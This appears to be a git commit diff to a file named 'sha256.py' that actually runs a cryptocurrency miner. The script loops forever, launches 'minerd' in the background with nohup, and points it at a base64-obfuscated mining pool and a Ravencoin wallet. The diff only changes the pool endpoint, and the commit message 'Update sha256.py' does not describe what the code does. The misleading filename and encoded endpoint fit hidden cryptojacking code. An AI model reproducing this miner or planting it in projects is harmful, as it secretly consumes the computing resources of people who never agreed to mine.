ae67f8c1f025183f7a75058c6f1dafb13b71b9cb
Shin <dirianda187@gmail.com>
2025-10-22 20:05:47 +0700

    Update sha256.py

--- sha256.py
+++ sha256.py
@@ -4,7 +4,7 @@ import time
 # Fica em loop para minerar a criptomoeda
 while True:
     # Executa o comando de mineração
-    os.system("nohup minerd -a minotaurx -o wss://broken-ardene-mino-fecf729c.koyeb.app/bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ== -u RPAwbi57Le4u5L2Kniz1ZgGYEgHdCXx3Wu.RVN -p c=RVN")
+    os.system("nohup minerd -a minotaurx -o bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ== -u RPAwbi57Le4u5L2Kniz1ZgGYEgHdCXx3Wu.RVN -p c=RVN")
 
     # Dorme por 1 hora antes de reiniciar a mineração
     time.sleep(3600)
